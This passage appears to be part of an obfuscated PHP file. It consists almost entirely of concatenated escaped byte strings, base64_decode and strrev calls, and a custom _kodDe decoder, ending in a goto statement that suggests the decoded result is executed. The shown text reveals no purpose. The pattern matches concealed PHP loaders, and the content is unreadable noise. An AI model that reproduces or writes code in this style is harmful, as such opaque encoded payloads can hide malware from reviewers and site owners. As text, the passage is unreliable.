d\xe0\x58\xb1\x5\x86\x6e\x83\xcb\x30\x7\xf1\x8\x45\xa0\xac\x4f\xc7\xe6\x4c\xd4".base64_decode('uAQbn/GC1F3WNxfqkTx27mG9VyzXChn5B4tElvPNH4zqYktGxYj12DcWEvSPfIkU')."\222\150\246\253\14\101\107\152\351\2\63\237\201\144\201\143\210\120\167\105\324\16\264\27\104\30\307\140\130\161\7\355\145\245\200\24\330\210\241\111\370\211\141\56\234\307\346\220"."\33\41\172\67\11\223\275\32\221\125\36\142\332\30\340\233\113\354\324\1\372\263\74\227\364\242\206\3\326\45\165\233\373\104\302\324\214\31\61\342\66\113\226\314\71\116\375\106"."\45\47\204\332\210\216\215\305\230\264\243\114\51\6\272\122\336\71\150\42\276\225\212\105\172\242\354\352\4\307\261\310\110\215\6\133\227\363\133\14\16\155\17\54\161\103\102\130".base64_decode('5BdYUBHMBVEYTk58ajSCJXbBcLurQKyD+4x0wtRwqGtRxQTEN3RKRSgwFA92umHO')."\x1a\x62\xc1\x40\x94\x39\x1b\xc5\xf1\x96\x70\xa4\x55\x4a\xe\x45\xca\x47\x82\x33\x26\x1c\x48\xe5\x7d\x14\xe8\x5f\x51\xd3\xb7\x9a\x1c\x59\x1a\xd1\xc9\x25\xb9\x6\xb\x6\xbc\x6a\xff\xe4\xda\xe6"."\xbe\x53\x6b\x6b\xfa\xfc\xcd\xbe\x3a\x2e\xcf\xa2\xe4\x4a\x32\x95\xdd\x3\xd8\x62\x9b\x48\xa3\x1b\x80\xf7\x1f\x6\xa4\xc5\x20\xe6\xf7\xf9\xe0\x23\x3c\xe0\xef\xf3\x73\xc7\x5b\x6c\x83\x0\x47\xbe"."\x31\xea\xa2\xc8\xd1\xa\x97\xef\xe\x66\x14\xef\x73\xfb\xa8\x54\xb1\xf1\xad\xca\xd7\x13\xbe\xea\x54\x63\xcb\x63\x7c\xe4\x29\x1a\x56\x4a\x77\xe0\x1a\xcd\x26\xab\x35\xb8\x32\xa3\xbf\xdd\x72\x56"."\254\111\123\61\243\3\131\35\306\307\62\310\147\230\142\35\210\5\233\64\23\45\354\21\111\214\276\60\125\106\40\237\243\12\104\252\207\304\351\32\326\133\214\255\313\74\332\5"."\141\233\155\105\314\342\202\216\320\302\105\341\316\256\110\367\342\150\54\336\263\144\351\262\345\247\300\110\63\164\110\51\136\346\320\14\374\137\372\107\264\242\177\204\171\160\136\202"."\x79\x7d\xdd\xf2\xcb\x3c\x14\x7\xa2\x3e\x22\x52\xc7\x8\x95\x9f\x8a\x0\x78\x2a\xa6\xb\xfe\xca\x49\xb4\x36\x7f\x2e\x6f\xd7\xef\x21\x47\x77\x51\x1f\x30\x4d\x7b\xf\xa9\x4b\x3a\xbf\xbe\x62\x48"."\xec\xed\xb3\xfa\x19\xfe\xf9\x93\xfa\x8\x4\x85\xea\x9a\x25\x4e\x38\xc0\x3e\x78\x65\x4f\xd2\x18\x55\x65\x8e\x2e\x39\xe0\xda\xe7\x1\x90\xe5\x2c\x99\xc4\xd\x8\x20\xb1\xeb\x14\x6e\x55\xf3\xc0"."\361\214\263\333\16\342\115\254\325\344\237\151\140\72\206\313\275\71\157\262\57\276\0\273\307\354\73\205\343\206\121\224\374\123\46\314\174\322\220\34\51\150\11\306\354\225\22\103"."\xdc\x1f\x1\xde\x29\x2c\xef\xa8\xc1\xb0\x6f\x22\x3f\x26\x82\xaa\x95\xaa\x25\xe8\xb1\x59\x52\x33\x1c\xf6\xe2\x53\x93\x57\xcb\xa6\x4d\xc4\xe8\x65\x72\xc\xaa\xd\x39\xd2\x85\x6b\xd8\x82\x99\x35".strrev('p4Ê¤cm>äQpëßxAâGd’^Lx±X¯¸&U‹~ÙÊ£3F”„ú/aºË˜')."\xfc\xdc\x8e\x38\x70\xc9\x50\x94\xb9\xde\x15\x1c\x1a\xe6\xea\x88\xaf\x63\x1a\xf5\x28\xc2\x65\x3c\x13\xab\xd2\xb3\xca\x89\xae\x5\x4a\x3c\xe5\x8\xb6\x3d\x21\x3b\x53\x60\x84\x3c\x37\x24\xf4\x44".base64_decode('ckNcayPhYGQwzyBiRYlXAe/tKK1lnOl5gbFpy3hUenzC4chC9ncfWBqb5u3oDLR6')."\xd1\x76\xc4\x6d\x20\x10\x13\xd0\x17\x47\x5c\x0\x43\x2c\x6d\xd4\x9a\xc6\xe\x3e\x14\x32\x79\x86\x92\x41\x33\x1\x18\x53\xee\x41\x76\xa2\xd3\x9b\x32\x5\x52\x97\xa8\x89\xa2\x9e\xc4\xba\x34\x8c"."\353\244\120\27\46\121\240\240\53\64\116\135\355\1\12\242\225\304\33\214\273\101\103\225\276\273\254\342\167\227\125\372\356\62\327\167\227\225\177\227\202\134\30\253\25\12\255\31"."\214\13\16\352\353\0\45\344\10\333\5\123\130\67\110\326\70\2\11\54\125\70\366\241\344\66\312\200\47\171\176\113\204\370\252\110\111\353\305\121\235\17\266\10\50\356\307\312"."\7\64\230\325\54\173\211\303\143\322\67\172\57\306\236\101\72\371\141\203\363\271\176\323\262\374\330\313\43\341\356\271\146\135\44\306\356\230\234\175\242\117\246\110\302\0\160\64".base64_decode('x53wche9wo8vvRqg4SD3foMOKYE0dniC6ByMSnCsYFq67BY6qROvo9zCX/K2nNPG').base64_decode('MCWyWEz4XWZejGWXj3jAvDmHn/gxL+q6y3OxpetDTC1SOrBwoUQ390js7g4mBYIo').base64_decode('FrkPanqr7K0I8EqeMig1kDyao3ZB1biZsH4zZGygzwn6c0qlXnuLwkU0mkv6DsEi')."\175\234\271\137\166\255\0\227\307\346\276\5\175\235\175\161\171\230\354\242\226\112\241\146\113\116\140\35\155\21\16\242\1\375\310\323\1\154\60\366\354\136\32\56\117\116\256\350"."\235\32\22\311\11\305\217\162\140\17\11\243\234\75\364\223\67\110\52\340\356\142\14\7\354\115\11\115\335\102\111\172\6\107\306\27\274\355\263\41\45\222\15\352\324\233\221\14"."\342\154\33\234\371\67\261\36\241\241\313\267\230\111\330\23\127\127\41\114\254\152\254\232\130\203\176\153\253\74\125\230\261\45\161\74\213\30\100\332\121\325\70\261\206\4\152\301"."\x75\xcd\x2a\xb0\x6f\x91\xfc\xdd\x8a\x1b\x7b\x10\xc6\x35\xa3\xa1\x95\xae\x99\x9a\xc9\x68\xe0\xb5\xdf\xe0\x6f\xf0\x8f\x2\x3d\x68\x1e\xc6\x5f\x14\x2f\x72\xb8\xf7\x80\x31\x15\x91\x3d\x76\x7d\xa2"."\312\304\27\310\72\214\272\234\322\301\133\302\310\162\147\33\124\277\314\33\350\74\305\53\74\120\317\155\36\313\145\25\70\225\66\125\327\373\246\124\53\354\305\226\246\352\236\170"."\273\167\126\165\363\274\203\346\266\222\113\147\133\357\304\267\306\130\146\102\205\5\363\340\122\150\56\136\136\74\342\167\306\366\124\26\360\57\247\255\62\363\150\253\103\24\52\347"."\113\300\140\366\160\52\46\234\202\347\165\173\324\54\302\215\72\20\330\206\51\323\144\234\6\24\261\330\322\46\2\252\106\54\107\145\335\357\51\214\227\362\136\54\262\360\306\144"."\xef\x84\xae\x67\x8\xa6\x38\xf3\x63\xa1\x83\x33\xbf\x4c\x1a\x13\x82\x7c\xe4\x44\x90\x3e\x29\xd1\xa8\xc8\xef\x8c\x48\x2e\x97\x89\x40\x8b\xae\x4a\xa6\x1c\x2\x30\x4c\x35\x19\x48\x50\xd0\x94\xb0"."\27\300\44\121\165\222\304\371\256\366\342\241\366\42\246\13\343\77\132\124\150\373\265\365\112\131\234\217\131\270\237\270\160\217\2\51\202\47\327\53\277\235\61\206\70\164\234\214"."\xbd\xe8\x7b\xf1\xfc\x7a\x8d\xe4\x9e\x52\xc4\xa2\xae\xd8\xd4\x4\xa0\x4a\xa5\x2c\x3d\x25\x23\xe9\xfe\x24\x51\x62\xf0\x96\x4a\xec\x83\x15\x2b\x95\xcf\xf\x2c\x3\xe9\x44\x88\xd7\xe7\xe0\xcc\x35"."\x34\xd7\x9c\x19\x77\x33\xf7\x82\x47\xd1\xca\x3d\xd3\xa3\xc5\xab\x34\x4c\x6d\x9c\x3e\xbb\x91\xd9\x9e\x9d\xcc\x74\x30\x4a\x5\xa6\xb2\x8d\x82\xcc\x73\xfd\x89\xfe\x14\xa3\x3\xe2\x75\xb\xd6\x37"."\74\341\222\253\177\7\130\14\43\137\341\214\200\70\362\211\326\72\336\115\201\206\160\375\151\32\57\345\305\1\11\334\25\113\317\25\20\51\74\135\145\130\153\111\345\217\72\124"."\xa0\xb2\x4\x57\x79\xbd\x49\x66\x4\x6b\xb0\x73\x96\xf4\x21\x3e\x75\x69\x16\x28\xf2\xfc\x9a\x58\x4c\x3\xd9\x21\x51\xe1\x0\xd6\x63\x87\xb5\x30\x84\xba\x64\xa\x86\x8c\x6c\xce\xb2\xc0\x3b\x53"."\312\17\65\111\211\212\155\232\112\116\313\217\303\271\141\222\325\70\311\232\203\77\324\204\65\370\55\24\241\11\302\265\57\336\161\204\43\106\352\106\10\122\350\15\204\17\277\314"."\xe2\xc3\xdb\x59\xb4\x24\x3d\x48\xa5\xa2\x7d\xcb\x75\xf1\x2d\xbf\x5b\xd7\x9d\x2d\xf1\xe7\x35\xa\x24\xc\x9d\xe8\xe\xf7\x2c\x8\x75\x49\xda\x58\x12\x40\x6d\x6d\xeb\x52\x3\xdd\xdd\x15\x13\x60"."\xea\xa8\x74\x12\xab\x32\xf8\x98\xa1\x36\x7e\xa9\x8b\x86\xe6\x1a\xb9\xb4\x92\xc0\x96\x22\x4d\x55\x18\x5a\xa5\x58\xc5\x4\xf3\x81\x5c\xe5\x7\xa2\x4c\x32\x88\xc3\xd8\x5c\x3\x8a\x54\xe3\x22\x4a".base64_decode('CvXJS0I0uXreXL8xj8+H8OtUNIUhjM9/Ej6a+bG+U/5kjACy+gWBtgsvTooyV1Po')."\x50\x37\x55\x13\x21\x7c\xb5\x92\x41\x9b\x3b\x57\xf6\x9c\xe7\x2e\xdc\xc5\xee\xc0\xe6\xfa\x35\x39\x11\x2f\xd3\xa8\xc9\x78\x69\x7e\x22\x1b\xe1\x1e\xc\x2b\xde\xa3\x4\x24\x8f\xe9\xe4\xe1\x8c\x56"."\55\277\244\274\10\256\334\227\220\223\350\114\22\123\235\362\374\176\42\206\360\213\303\247\363\242\211\337\313\124\100\212\202\226\30\302\250\46\166\20\370\22\44\164\343\123\16\115"."\160\274\377\140\113\132\46\45\154\254\106\344\372\105\361\110\315\352\325\264\42\314\64\234\172\152\71\14\24\125\335\111\201\202\341\6\141\174\161\303\360\251\135\300\320\126\350\374".base64_decode('DMVVOZOAsDz0V5QJdy0QEbqgHIm9TCecxPp6q311p57qN5g6F1M9YWV9PDeN9/mc').base64_decode('+VFPYOh5RgC4c1IWdCEsuYP8dcLAjqttKViXq6lpXi+/tepnaYyPNOpnsUlflfHG').base64_decode('l/Jga5fglOkwudCcUhQfkb4EnP6Sm0f4UyxyURoOFBy1+lkEX29kjQE/X+/0ysOX').base64_decode('EDZqLAuhNi441r9yJWDrGgIeQRQTMXGDbjiqiwN5YK6VKBoF20Gp6OuLVeSpnEFt')."\x44\xa3\x59\xaa\x14\x38\xee\x37\x55\x91\xa7\x2\xaa\x10\x65\xa2\x29\x40\x12\x44\x53\xe6\x62\x12\xa4\x14\xf5\x6c\x53\x15\x69\xae\x95\xd1\x75\x54\x9e\x10\x99\x4a\x1f\x41\x5\xab\x14\x46\x1f\x73".base64_decode('Gh+xom2ivZLbQMHDVT1RsOwIdMGV0kkr6O/Ekxi2kOfTsnqR6q0TgkMuM1NCNgYP')."\150\165\107\43\361\110\53\173\157\250\222\20\155\32\343\203\55\152\327\47\316\113\314\372\210\253\167\260\34\234\263\360\3\4\346\275\130\312\347\271\246\34\146\65\371\246\206\65"."\x6f\xd4\x85\xb1\x48\x17\x7b\x9f\x25\xce\xd1\x6\xdb\x41\xf9\x94\x5e\x8d\x5d\x7e\x81\x8a\x2d\xbd\xcd\x8b\x65\x4a\xb6\xd8\x40\xf1\xa3\x3\x71\x6c\xd4\x6c\x1\x58\x72\xc3\x88\x9d\x40\xa2\x8a\x7a"."\xa9\xcc\xb3\x69\xa\x33\x32\x61\xa\x78\xc2\xc0\xd\x72\x56\xa8\x83\xca\x9f\xe3\x5c\xc1\x4d\xcf\x3b\x44\x29\xf4\xdb\x59\x93\x79\xa6\x6c\x98\x32\x65\x8a\x77\x4a\x3d\xfa\x9f\xa9\x68\x33\x7f\x78"."\215\314\211\201\224\145\312\224\106\362\77\115\40\322\140\230\24\147\12\42\4\214\202\101\206\121\135\207\6\301\246\220\63\362\45\306\235\365\266\142\103\65\5\67\15\272\54\24"."\364\320\174\20\207\221\214\230\314\221\316\224\163\24\162\313\11\61\335\75\10\374\372\30\146\130\366\46\316\302\210\365\101\263\115\6\5\332\313\255\42\121\66\201\107\163\250\21"."\x6a\x13\x6f\x54\x30\x9f\xec\x95\x3f\xe6\x63\x83\x4b\x81\xc2\x3\xb6\x97\x25\x78\xe5\x17\x2b\xa0\x10\xdd\x26\xc4\xfd\x89\xa3\x69\xa8\x8c\xd3\x13\x25\x86\xa0\x4d\x3a\xc1\xfb\x89\x1\x92\xe8\x5"."\xf3\x71\x92\x77\x4d\x1c\x95\xaf\x49\x48\x32\x37\x2d\x24\xb1\x2c\xf7\x78\x80\xa3\x5d\xbc\x26\xfa\x30\xa\x35\xf1\x83\x31\xac\x80\xae\x19\x73\x54\x15\x3b\x32\x8e\x2e\xe4\x31\x32\xa4\xf8\xec\xc5"."\320\60\51\231\177\342\161\145\364\130\312\316\305\125\102\307\1\124\66\210\33\200\41\43\353\60\176\126\245\242\362\330\316\301\31\131\117\342\316\222\270\42\264\242\3\374\171\30"."\252\102\311\332\246\300\322\243\121\342\17\233\274\354\107\265\136\33\17\52\233\134\333\75\261\144\216\212\246\260\144\56\123\134\142\61\151\246\230\350\75\366\15\272\105\14\22\144"."\0\252\226\323\312\335\120\112\25\270\223\134\145\2\124\142\137\126\0\340\345\271\311\55\107\205\334\30\356\312\115\34\120\266\162\277\272\262\127\112\252\262\40\251\311\130\360\56"."\x80\xd0\x51\x60\x75\x8c\x48\x47\x2f\x5f\xa1\x68\xa6\xd1\xac\x5b\xf2\xa0\x21\x78\x77\x65\x30\xcf\x5e\x9e\xb3\x42\x26\xde\x7a\x39\x9f\xc\xc4\x57\x28\xec\x7d\x4d\x40\x67\x61\x4d\xad\x89\xe7\x7d"."\xa5\xac\xe2\x5c\x29\x1\x9d\xab\x59\x4a\x68\xe5\xaf\x38\xc9\x40\x7c\x78\x93\xb5\x52\x88\x2e\xb1\xb3\xe\x7c\x2a\x74\x42\x78\xcb\xbe\x6\xe9\xd8\xb9\xdf\x86\xb7\x58\x65\x4d\x4a\x9a\x4d\x50\x24".base64_decode('LJORJceqA00YrjIlGDxC4lLaCacwejJ33EvFCaHL6uxpWAqliwpXQJSFXIMqFgIs')."\335\246\46\271\230\63\355\57\347\374\17\13\374\230\345\302\303\312\5\213\262\304\35\17\251\52\13\115\360\212\356\340\57\222\126\100\104\47\262\225\141\25\341\17\160\5\320\32"."\264\232\245\30\256\35\10\231\7\35\370\54\52\337\363\140\260\102\237\351\124\362\72\267\141\167\116\252\134\0\336\122\62\21\77\205\175\332\312\205\160\135\75\56\22\265\310\101"."\21\171\133\173\111\143\231\42\236\62\311\327\0\112\202\223\330\343\10\224\36\213\33\147\77\164\273\27\165\253\37\61\370\153\370\156\2\23\322\113\251\61\253\23\67\31\102\111".base64_decode('Nj/DJZ1x6tI+oUiVANmOZ4qmzU90OB3hoYiEZXYtTot454nvOC4kJcfgPCva19nX')."\65\266\327\23\155\66\342\130\135\72\144\272\242\156\335\77\262\57\333\154\153\145\236\326\205\132\34\236\306\230\244\54\125\341\13\120\210\27\1\206\241\250\47\314\42\221\61\110".base64_decode('ri7ydlRPy9GwyWUr+AJMr1AF9i4kLXOM9ejUX5J9FUkO2VFM8rwvMX7eeoVzjCqt')."\231\106\46\113\11\44\177\45\346\321\45\56\224\114\121\210\120\43\126\32\340\267\66\56\226\216\131\267\50\62\307\304\314\125\160\5\304\155\14\356\201\45\247\241\152\261\143\144"."\321\63\271\10\371\146\131\21\232\206\231\26\341\174\105\116\261\260\113\375\36\66\155\225\122\52\174\212\44\111\43\232\340\356\250\140\164\304\40\101\302\270\316\364\103\275\365\15"."\xde\xa9\x70\x29\x20\x9b\xbe\xb0\x53\x3\x8d\xe1\xa3\x8b\x84\x6\xf8\x80\xc5\xc8\x6\x68\x57\x42\x3e\x91\xc7\x94\xee\xbe\x88\x43\x16\xe1\x86\x82\xf8\x9e\xe1\xf3\x49\x9c\xd4\xf0\x58\x51\xda\xbb"."\165\256\171\111\274\265\310\144\124\250\50\120\205\114\234\241\247\122\72\35\41\234\334\346\120\241\165\145\100\53\303\231\16\276\365\105\143\250\303\30\323\241\370\344\252\4\136\160".strrev('Q±jkMG†'."\n".'5%P•Œ'."\r".'urÀäÜp	.œÑ'."\n".'a±ú‚ÕB04¿ƒÔ™1„?D¥ _')."\260\103\246\325\71\316\115\67\261\362\25\336\24\271\342\254\45\107\130\52\107\116\313\21\241\312\146\216\322\34\304\163\215\352\314\276\227\311\136\272\73\272\375\34\324\302\227\47"."\75\252\13\367\131\255\114\243\113\37\323\23\120\127\316\110\50\341\310\202\120\153\40\334\26\212\55\122\322\272\255\10\275\22\362\2\207\163\51\23\1\43\35\170\206\325\3\374"."\61\10\34\364\16\40\16\335\233\344\247\30\113\234\127\44\225\73\351\35\55\147\265\24\377\364\142\131\215\171\154\266\223\55\53\203\305\246\25\162\147\205\74\121\312\134\50\352".base64_decode('5fnHdaxbJbVYKlCq0BrIX/kL5MUOOTdiPPT8nhpv5EcMyxALn5UYl2sPtHWGutRA').base64_decode('OBxZ6lBNFALjIn8fJSk/pyLNjJgE+vVyr27gE0v2XO8SW9Dpkz39FdgNCbwIyV9X')."\xa0\x51\xe9\xb5\xa3\x42\x51\x33\x2c\x5d\x2\xd0\x57\x7a\xea\xc0\x4a\x46\xcb\x66\x1d\xef\x1c\x66\x53\x52\xb4\xe4\xdc\x59\x2b\x7e\x4a\xa5\x1f\x60\x30\xc9\x99\x60\xa5\xc\x51\xfc\x80\xfd\xff\xba".base64_decode('qUZSOPIykkylgxs10ocXWuU3Mdk3y150+sa3oTziTkklro7YE3UmOX4Ab0xhoYhK')."\275\376\210\117\240\203\161\161\274\40\137\377\371\223\354\171\34\306\134\142\177\205\101\166\223\204\43\342\40\200\263\103\155\370\163\364\170\210\116\275\130\310\305\216\14\114\325\24"."\321\11\30\147\307\365\267\353\225\53\267\126\256\343\131\371\262\157\220\47\26\150\132\57\356\16\312\331\57\72\207\142\374\11\25\121\324\235\122\241\1\50\131\21\62\44\236\101"."\x69\x52\xa6\xd0\x7\xd7\xf8\xf3\x18\xca\x5c\x66\xa2\x2d\x3e\x40\x3c\x8c\x5\x73\x5\xdb\x71\x74\xee\x90\xd5\xef\xa5\xb9\xa1\x0\xc2\xe9\x88\xa3\x11\x56\x4c\x32\x73\xe3\x65\x0\x87\xe0\x28\xcc"."\xda\xc5\x35\x19\xf1\xe3\x20\xf9\x94\x29\x8f\x1f\x21\xc8\xd8\x96\x82\x3e\x9b\x48\xcf\xe8\x1e\x74\xb6\xd1\xed\xf2\x37\x96\x68\xf1\xff\x2f\x5\x69\x62\x4c\xd2\xef\x74\x56\x52\xde\x20\xcb\xbd\xd5"."\11\266\13\77\37\225\61\107\235\157\47\142\210\373\301\50\307\123\121\322\242\41\226\304\362\343\126\316\102\236\262\107\132\24\362\50\256\202\120\35\146\21\273\237\262\344\145\52"."\175\172\22\375\351\203\137\266\235\271\33\101\11\25\174\262\226\43\125\153\306\310\46\213\134\323\106\0\72\165\161\60\47\245\260\262\211\306\36\377\45\57\311\101\167\371\273\60".strrev('@½%®ÖXrã-b&ªa‘ÊÒ×¸İã¶X1b[ß…E|éŞÄƒWˆÛÏŞÃ^•')."\211\60\220\106\222\317\367\74\51\3\173\212\57\351\41\217\306\121\122\347\176\170\106\132\151\234\176\312\245\323\131\163\100\313\106\251\202\232\303\362\246\210\116\123\134\351\324\221".strrev('ÖO9Ò‹@wõ*!ò•c\\ Q]]\'8gzUöìJ‡x´„x°ëı-ä£. ¡Zü‚')."\x8c\xa6\x97\x77\xc2\xc6\xe\xb2\xa3\x76\x76\xd3\xdb\x3a\x18\x30\xb9\x4a\x76\x83\xca\x45\xd0\xed\xd2\x23\xf1\xfe\xf2\x1b\x57\xac\x7a\x7\x14\x45\xd6\x4c\x85\x2b\x6f\x9f\x7c\x10\x83\xc\xca\x5c"."\105\240\206\143\41\143\124\102\334\60\175\226\217\120\12\231\161\377\32\250\364\50\22\74\377\127\351\215\43\212\371\344\247\115\117\361\103\15\216\213\315\135\366\75\42\64\62\334".base64_decode('L/OVvzLIXhRkSweeE6zwRuAenxj0CHPKr3s6SRj9Od+Uxv3grAE/N5QdPdynDj6s')."\xae\x2\x51\xf7\x20\xc7\xcd\x72\x79\xac\xb8\x93\x76\x3c\x80\x28\xf5\x1a\x48\x5b\xf9\x23\x8a\xd2\x30\x48\xfd\x2e\x15\xb3\x1e\x72\x3d\xef\x61\xbe\xfb\x2a\xbe\xc3\xe8\x78\xc8\xc9\x3d\xa1\x15\x5e"."\162\374\306\12\101\57\230\34\272\222\116\252\327\70\167\240\310\356\70\335\331\14\7\356\252\105\135\30\13\121\107\253\145\33\304\362\134\262\141\352\364\331\262\160\103\114\241\270"."\20\234\112\177\340\2\23\270\25\201\24\212\143\30\74\12\363\356\52\257\176\222\350\124\331\56\177\347\323\265\3\374\357\26\214\70\75\320\254\222\2\165\371\173\311\145\43\100"."\xf0\x54\x52\x18\x92\x36\x44\x97\xea\x87\x89\x75\x33\x2c\xb1\xea\xe8\x16\x28\x9e\xfa\x74\x7e\x8b\xb2\xf\x15\xfa\x21\x3e\x2b\x2d\x16\xfa\x54\xa3\x99\xc5\x67\xec\x1c\x96\x95\xdb\x45\xcd\x79\xa0".strrev('%mX¹±¶ØYòFD‘"ûÇ(·M´k’°t²DSH·w]yiÁ#"nt¬')."\xfa\x5f\x4c\x20\x3b\x23\xd1\xe3\x94\x50\xfc\xa9\xd0\x73\xff\x7c\x46\x5a\x2a\x3c\xc5\x29\xe9\x4e\x7c\x4d\xbb\x29\x77\xc7\xcf\x83\x5e\xcd\xf6\x4a\x8\x29\x89\xf\x75\x3b\x42\x26\x18\x48\x84\x38".base64_decode('tjr76qoeFRN19HuUPWUqZ/GkFzuFizGJucOlmVXpHk79jFLJb5HaGXF8oSvUsVol').strrev('bÃ”×lzWG…:S–²’j`›€°2ÜÄ©Ï'."\r".'`\'A‘A'."\n".'2KUå^H©©²ÉŸ')."\324\61\245\217\60\117\264\350\353\216\323\45\212\267\271\336\136\46\124\311\375\40\63\33\42\102\12\4\225\223\54\171\35\107\31\376\104\235\343\150\143\271\337\245\104\14\236\354"."\x4d\x1a\x45\xdd\xef\xfa\x2\x39\x24\x2a\xf6\xf4\x6b\xd2\x86\xca\x1a\x95\x96\x42\x5d\xa5\x9c\x88\x48\x22\x5d\x72\x8a\xe2\x89\xe\x83\x67\xec\x2a\xcb\xb5\xf2\x99\x19\xb5\xe5\x7a\xaf\x96\xfa\xf9"."\245\141\306\354\377\377\176\222\361\377\326\113\214\323\247\60\341\273\343\71\347\5\300\162\103\153\361\215\42\27\101\120\301\257\253\37\316\115\363\100\300\42\376\130\271\24\347\172"."\xc4\xcc\x5d\x1a\xf3\xa2\xa6\xb1\xb\x27\x2d\x9b\x95\xb6\xd6\xca\x87\x94\xb2\x87\x72\x11\xf2\xd\xf1\xb7\x55\x2b\x45\xdc\xf6\x7a\xee\x47\x73\x7b\xd9\x83\xf2\xe4\x3d\xdc\xfe\x4a\x19\x5\xe5\xe1"."\x67\xa1\xa\x78\x4c\x41\x8c\x5\xce\x97\xdf\xf\xe3\xf9\xa\x3b\x3d\x71\x4b\x4c\x46\x59\x36\xf1\x55\xc4\x8b\x30\xcf\x73\x7e\x16\x4a\xe0\x63\x1f\x71\x7\x1\xe3\x25\x1b\xf6\x46\xa\xec\x80\x58".base64_decode('C5S9H37BTQBQJZkSOUBl9CvumAUHUB5gmDVsF80m0FGi0/XoJ81kyaPpENGXqwuU')."\227\346\53\137\56\202\225\262\235\122\53\376\164\373\24\367\133\356\365\336\362\217\121\173\11\54\70\211\142\121\5\23\76\221\133\34\162\175\132\241\14\305\324\230\310\263\207\265".base64_decode('UnnF8sdWhSQOh+T+spXfXTQJQ+eEcvGNpOgqvT4+ySe3WCKsrlsRdFYT14SGSdzx')."\263\242\75\235\65\304\364\7\60\26\35\37\332\115\61\367\322\73\337\170\115\11\57\227\330\47\31\221\30\256\221\166\155\146\215\47\251\250\3\310\41\327\263\344\227\117\234\45"."\xb1\x79\x82\x73\x2d\xcd\xab\x94\x2d\x61\x16\x2d\x29\x1b\x87\x57\xca\x8b\x31\x4c\x96\x5b\xc8\x69\xf8\x25\x66\xdb\x31\x17\xe2\x65\x5\xf7\x8b\xa\xe4\x34\x4f\xf\xe8\x8e\x73\x3a\xdc\xe4\xca\x20"."\xe9\xa2\x13\x31\xdb\x49\xe7\x13\x2d\x24\x91\x80\x99\x43\x54\xa8\x41\xba\xaa\x73\xde\x94\x72\x3f\xf2\x65\x94\xb2\x64\x84\xa5\x64\x52\x8a\xf9\xd9\x43\xbf\xd8\x62\x31\x24\xdc\x68\x90\x64\x7a\x9"."\21\220\236\373\166\227\162\276\14\57\335\253\46\10\346\5\313\257\316\304\215\236\304\147\260\142\370\44\44\266\0\27\274\322\103\347\51\155\104\60\111\202\27\117\46\333\265\221"."\xa\x59\x93\xec\x34\xc2\xa1\x8\xc2\xb3\x12\x26\x4b\x32\x82\x16\xea\xf0\xfa\xa8\xfb\xbd\x67\x9f\x6c\x38\xed\xc8\x58\xe\x15\x46\xd2\x52\x79\x71\x89\x22\xba\x89\x61\x95\xba\x4f\x16\x9a\xb3\xb8"."\x6c\x84\xcd\x91\x4a\x80\xe8\x23\x1b\x5c\xeb\x4a\x3a\xf7\x60\xcb\xf\xa1\x8e\x45\xbb\xc2\x8f\xf7\xe2\x93\x4e\x93\x6f\x9e\x8d\xcf\x19\xca\x43\x2c\x72\xbc\xe\xa8\xeb\x24\x87\x25\x29\x8c\x63\x70"."\45\131\362\133\315\316\353\122\131\336\40\241\200\236\15\113\325\311\127\251\173\54\20\253\374\21\201\225\316\41\226\154\345\105\2\333\352\344\132\34\44\222\167\14\162\106\345\104"."\x47\x73\xdc\x53\x4b\xe\x21\x2\x7d\x29\x30\x47\xc4\xb8\x34\x2d\xe0\x4c\xa2\xf9\x75\x57\xeb\xe5\x2\xee\x9e\xd1\x12\xd6\xa8\x61\x27\x32\xd2\xc9\xa8\x3c\xb1\x1c\x5e\x2c\x1b\x54\xf8\x50\xe5\xf6"."\xba\x5b\xc5\xc6\xd4\x7d\x5e\x14\x95\x94\xb5\x47\xd2\xc7\x88\x9b\x15\xca\xd0\x16\x55\x2c\x46\x93\x70\x49\xc1\xae\x3a\xca\xee\x61\x8\x70\x59\x9a\x84\xcb\x96\x25\xb3\xc2\x92\x78\x45\x2a\x67\x6b"."\45\153\17\335\53\37\74\220\71\44\53\164\330\165\62\247\131\367\64\236\25\63\227\177\16\60\316\235\233\10\51\52\267\102\310\26\134\367\342\225\132\121\61\363\36\133\41\162"."\273\166\201\112\264\226\245\124\240\256\102\101\242\234\216\213\264\12\352\32\264\116\274\107\313\176\266\52\44\313\272\37\225\265\103\242\25\227\276\345\124\333\160\301\345\201\1\67"."\255\64\302\364\271\320\111\61\153\14\11\115\66\246\205\76\311\101\337\113\371\241\274\311\367\214\244\320\62\304\32\322\201\242\173\40\313\152\163\342\151\276\44\171\276\255\250\24"."\357\301\347\372\362\23\164\126\143\222\177\311\232\200\36\171\114\333\110\350\116\367\272\262\273\55\232\316\76\222\225\144\203\56\261\234\220\62\70\324\12\52\10\256\10\210\6\175"."\102\102\116\353\23\175\221\160\302\141\305\101\371\4\270\130\240\167\222\255\370\356\233\337\106\21\327\260\164\137\245\311\61\263\150\173\160\132\334\54\220\337\26\323\266\305\35\75"."\75\326\23\146\20\157\216\36\111\5\5\205\304\325\23\156\24\271\323\40\150\113\310\13\11\302\355\50\76\57\307\164\232\112\210\222\43\202\357\112\170\104\336\373\340\226\264\275"._kodDe('LKzWB7lm8g8quSLVil4/IFcVzEVggrrw+8L2SEETlO3okYjqmLPTofgLeGo3v+q6KQ==')."\336\340\204\342\364\371\54\256\134\372\165\65\200\24\125\124\101\275\265\23\131\27\230\333\304\342\261\262\244\356\100\54\266\64\22\155\243\316\335\313\222\111\51\111\51\251\54\251"."\273\43\322\265\247\264\140\147\40\24\56\113\303\372\113\135\252\360\220\106\223\102\335\244\225\344\22\160\117\255\10\265\56\22\55\41\327\315\102\70\137\310\230\114\346\316\56\57"."\x62\x1a\x7b\x9f\x56\xb6\x23\xd5\x73\xc2\x35\x9e\x28\x93\x37\x12\x43\x42\xb8\xa7\x49\xcc\xbb\xc5\x7c\x58\xf2\x80\xf3\xa5\x24\x97\x9a\x20\x43\x52\xa8\x8\xeb\x1e\x75\x41\xdd\xd1\x2\x40\xb1\xb3"."\x7b\xbe\xd6\x39\x23\x2d\xee\xcf\x7d\x8e\x7b\x76\x9\x4e\xd6\x3\x21\x30\x12\xce\xc9\x1b\x2d\x1\xd4\x55\x1c\x20\x59\xb0\x5b\x7e\xd1\x40\x52\xc5\x0\xe0\x86\x2d\x34\x41\x71\x6d\xd0\x1c\x90\x2e"."\x12\xe8\x31\x6\xac\x3a\x61\x48\x25\xfd\x32\x1a\x76\x24\xdb\x5a\xba\xe2\x75\x33\x95\xe6\xe1\x15\x2f\xe4\x6c\xff\x7\x56\x58\x97\xfe\x11\xac\x0\x0", 10, -8))); goto 